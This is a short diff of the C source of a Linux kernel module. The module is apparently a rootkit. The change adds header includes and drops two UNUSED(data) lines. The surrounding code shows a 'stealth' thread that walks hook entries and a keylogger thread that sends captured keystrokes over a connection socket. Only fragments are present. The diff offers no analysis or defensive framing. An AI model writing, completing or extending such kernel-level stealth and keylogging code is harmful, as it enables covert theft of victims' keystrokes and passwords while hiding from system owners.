@@ -14,6 +14,13 @@
 #include <linux/mm.h>
 #include <linux/syscalls.h>
 #include <net/sock.h>
+#include <linux/socket.h>
+#include <linux/sched.h>
+#include <linux/kmod.h>
+#include <linux/unistd.h>
+#include <linux/errno.h>
+#include <linux/list.h>
+#include <linux/spinlock.h>
 #include <linux/dirent.h>
 #include <linux/version.h>
 #include <linux/namei.h>
@@ -356,7 +363,6 @@ static struct task_struct *g_stealth_thread = NULL;
 
 /* Thread de furtivité */
 static int stealth_thread(void *data) {
-    UNUSED(data);
     struct hook_entry *entry;
     unsigned long flags;
     while (!kthread_should_stop()) {
@@ -792,7 +798,6 @@ static void keylog_send_buffer(void) {
  * @return Thread return value (never reached)
  */
 static int keylog_thread(void *data) {
-    UNUSED(data);
     while (!kthread_should_stop()) {
         if (g_keylog_enabled && g_connection_socket) {
             keylog_send_buffer();
